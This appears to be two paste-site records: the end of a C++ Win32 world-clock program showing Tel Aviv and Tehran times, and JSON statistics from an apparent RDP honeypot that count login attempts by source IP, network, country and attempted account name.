                // Tehran: Approx UTC+3:30 (Iran Standard Time / Iran Daylight Time)

                // The following time zone calculations are *approximations* and
                // do not account for Daylight Saving Time rules for each specific region.
                // For accurate real-world applications, use a robust time zone library.

                // Convert to time_t for easier manipulation (seconds since epoch)
                time_t currentTime_t = std::chrono::system_clock::to_time_t(now);

                // Tel Aviv Time (approx. UTC+3, assuming it's summer for simplicity)
                // This is a direct offset. For proper DST, you'd need a robust library.
                time_t telAvivTime_t = currentTime_t + (3 * 3600); // +3 hours
                struct tm telAvivTm;
                gmtime_s(&telAvivTm, &telAvivTime_t); // Use gmtime_s for thread safety

                char telAvivBuffer[64];
                strftime(telAvivBuffer, sizeof(telAvivBuffer), ""Tel Aviv: %I:%M:%S %p"", &telAvivTm);
                SetWindowText(hTelAvivTimeLabel, telAvivBuffer);

                // Tehran Time (approx. UTC+3:30)
                time_t tehranTime_t = currentTime_t + (3 * 3600) + (30 * 60); // +3 hours 30 minutes
                struct tm tehranTm;
                gmtime_s(&tehranTm, &tehranTime_t); // Use gmtime_s for thread safety

                char tehranBuffer[64];
                strftime(tehranBuffer, sizeof(tehranBuffer), ""Tehran: %I:%M:%S %p"", &tehranTm);
                SetWindowText(hTehranTimeLabel, tehranBuffer);
            }
            break;
        }
        case WM_CLOSE:
            DestroyWindow(hwnd);
            break;

        case WM_DESTROY:
            KillTimer(hwnd, 1); // Stop the timer
            PostQuitMessage(0);
            break;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// Entry point for the Windows application
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Register the window class
    WNDCLASSEX wc = {0};
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1); // Standard window background
    wc.lpszClassName = ""TimeDisplayAppClass"";
    RegisterClassEx(&wc);

    // Create the window
    HWND hwnd = CreateWindowEx(
        0, ""TimeDisplayAppClass"", ""World Clocks (C++)"",
        WS_OVERLAPPEDWINDOW | WS_VISIBLE,
        CW_USEDEFAULT, CW_USEDEFAULT, 300, 150, // x, y, width, height
        NULL, NULL, hInstance, NULL);

    if (hwnd == NULL)
    {
        return 0;
    }

    // Set a timer to update the time every second
    SetTimer(hwnd, 1, 1000, NULL); // Timer ID 1, interval 1000ms

    // Initial update
    SendMessage(hwnd, WM_TIMER, 1, 0);

    // Message loop
    MSG msg = {0};
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return (int)msg.wParam;
}"
zKNLyvG7,2025-06-15_stats.json,rdp_snitch,JSON,Monday 16th of June 2025 07:18:14 PM CDT,"{
  ""ip"": {
    ""24.173.30.170"": 18870,
    ""167.172.131.118"": 12975,
    ""80.66.79.30"": 14457,
    ""139.59.97.137"": 2733,
    ""64.64.112.155"": 9966,
    ""209.97.152.8"": 618,
    ""178.128.21.189"": 4272,
    ""45.79.168.199"": 12,
    ""45.79.73.71"": 3,
    ""157.230.86.112"": 3,
    ""5.135.169.222"": 3,
    ""190.85.239.111"": 3,
    ""96.51.53.164"": 6,
    ""147.185.132.21"": 9,
    ""103.15.222.151"": 6,
    ""2.57.121.247"": 6,
    ""165.227.207.152"": 3,
    ""194.165.16.161"": 6,
    ""87.106.235.201"": 3,
    ""141.98.80.148"": 9,
    ""92.63.197.23"": 18,
    ""198.235.24.177"": 9,
    ""91.238.181.94"": 6,
    ""197.145.218.12"": 30,
    ""185.196.220.41"": 18,
    ""181.30.39.44"": 6,
    ""205.210.31.111"": 9,
    ""143.110.220.53"": 3,
    ""197.210.194.240"": 3,
    ""31.222.238.98"": 9,
    ""185.156.73.154"": 6,
    ""147.185.132.60"": 9,
    ""64.64.112.133"": 588
  },
  ""asn"": {
    ""AS11427"": 18870,
    ""AS14061"": 20607,
    ""AS60602"": 14457,
    ""AS137409"": 10554,
    ""AS63949"": 15,
    ""AS16276"": 3,
    ""AS14080"": 3,
    ""AS6327"": 6,
    ""AS396982"": 36,
    ""AS149137"": 6,
    ""AS47890"": 6,
    ""AS48721"": 6,
    ""AS8560"": 3,
    ""AS43350"": 9,
    ""AS210848"": 24,
    ""AS49434"": 6,
    ""AS36884"": 30,
    ""AS213438"": 18,
    ""AS7303"": 6,
    ""AS29465"": 3,
    ""AS44477"": 9
  },
  ""isp"": {
    ""Charter Communications Inc"": 18870,
    ""DigitalOcean, LLC"": 17874,
    ""HYPER-HOSTING"": 14457,
    ""DIGITALOCEAN"": 2733,
    ""GSL Networks Pty LTD"": 10554,
    ""Akamai Technologies, Inc."": 15,
    ""OVH SAS"": 3,
    ""Telmex Colombia S.A."": 3,
    ""Shaw Communications Inc."": 6,
    ""Google LLC"": 36,
    ""TAN Thanh AN International Trade Development Company Limited"": 6,
    ""Unmanaged LTD"": 6,
    ""Flyservers S.A."": 6,
    ""IONOS SE ber.de"": 3,
    ""NForce Entertainment B.V."": 9,
    ""Telkom Internet LTD"": 18,
    ""Datacenter location PAR1 France"": 6,
    ""Wana Corporate"": 30,
    ""ColocaTel Inc."": 18,
    ""Telecom Argentina S.A"": 6,
    ""MTN NIGERIA Communication limited"": 3,
    ""PQ HOSTING PLUS S.R.L."": 9,
    ""OOO SibirInvest"": 6
  },
  ""org"": {
    ""Spectrum"": 18870,
    ""DigitalOcean, LLC"": 16335,
    ""Unknown"": 14487,
    ""LogicWeb Inc"": 10554,
    ""Digitalocean"": 4272,
    ""Linode"": 15,
    ""OVH BV"": 3,
    ""Telmex Colombia S.A"": 3,
    ""Shaw Communications Inc"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""TANTHANHAN"": 6,
    ""Unmanaged LTD"": 6,
    ""Flyservers S.A"": 6,
    ""IONOS SE"": 3,
    ""Cloud CDN"": 9,
    ""Korotkij Denis Aleksandrovich"": 18,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Colocatel Inc"": 18,
    ""Fibertel"": 6,
    ""MTN Nigeria"": 3,
    ""PQ HOSTING PLUS S.R.L"": 9,
    ""IP Kiktev Nikolay Vladimirovich"": 6
  },
  ""regionName"": {
    ""Texas"": 18870,
    ""New Jersey"": 13611,
    ""Chi\u0219in\u0103u Municipality"": 14457,
    ""South West"": 7005,
    ""Dhaka Division"": 10554,
    ""California"": 39,
    ""South Holland"": 3,
    ""Bogota D.C."": 3,
    ""Alberta"": 6,
    ""Hanoi"": 6,
    ""England"": 6,
    ""Kaunas"": 6,
    ""State of Berlin"": 3,
    ""North Holland"": 33,
    ""\u00cele-de-France"": 6,
    ""Guelmim-Oued Noun"": 30,
    ""Virginia"": 18,
    ""Buenos Aires"": 6,
    ""Ontario"": 3,
    ""Lagos"": 3,
    ""Drenthe"": 9
  },
  ""country"": {
    ""United States"": 32538,
    ""Moldova"": 14457,
    ""Singapore"": 7005,
    ""Bangladesh"": 10554,
    ""The Netherlands"": 45,
    ""Colombia"": 3,
    ""Canada"": 9,
    ""Vietnam"": 6,
    ""United Kingdom"": 6,
    ""Lithuania"": 6,
    ""Germany"": 3,
    ""France"": 6,
    ""Morocco"": 30,
    ""Argentina"": 6,
    ""Nigeria"": 3
  },
  ""account"": {
    ""hello"": 64548,
    ""ujwbhviu"": 12,
    ""beio"": 6,
    ""Unknown"": 3,
    ""EzNwRAaHD"": 3,
    ""ibMIVa"": 3,
    ""mAAbpJ"": 3,
    ""Administr"": 39,
    ""Test"": 15,
    ""gOPqHSWcK"": 3,
    ""aItDSj"": 3,
    ""MiyxaI"": 3,
    ""Domain"": 18,
    ""KuEsjCcLW"": 3,
    ""nfpQPF"": 3,
    ""QvyPYh"": 3,
    ""rnpUqqiPB"": 3,
    ""bomLZY"": 3,
    ""uEstPc"": 3
  },
  ""keyboard"": {
    ""Unknown"": 64677
  },
  ""client_build"": {
    ""Unknown"": 64677
  },
  ""client_name"": {
    ""Unknown"": 64677
  },
  ""ip_type"": {
    ""Unknown"": 18954,
    ""hosting"": 35124,
    ""proxy"": 10554,
    ""hosting & proxy"": 12,
    ""mobile"": 30,
    ""mobile & hosting"": 3
  }
}"
